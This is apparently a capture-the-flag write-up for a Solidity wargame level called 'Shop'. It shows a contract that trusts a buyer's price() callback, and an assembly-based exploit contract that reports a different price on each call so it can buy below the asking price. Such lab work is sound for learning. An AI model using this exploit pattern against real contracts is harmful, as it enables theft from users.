# Level 21 - Shop

### Objective

The objective of this level is as follows:

1. Сan you get the item from the shop for less than the price asked?

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

### Solution

Solution inspired by [this_post](https://medium.com/@this_post):

```
contract solveShop {

    Shop public shop;

    constructor(address shopAddr) public {
        shop = Shop(shopAddr);
    }

    function price() external returns (uint) {
    assembly {
        mstore(0x100, 0xe852e741)
        mstore(0x120, 0x0)
        let result := staticcall(gas(), sload(0x0), 0x11c, 0x4, 0x120, 0x20)
        if iszero(mload(0x120)) {
           mstore(0x150, 0x64)
           return(0x150, 0x20)
        }
        mstore(0x150, 0x0)
        return(0x150, 0x20)
    }
}

    function call() public {
        shop.buy();
    }
}
```

Done!
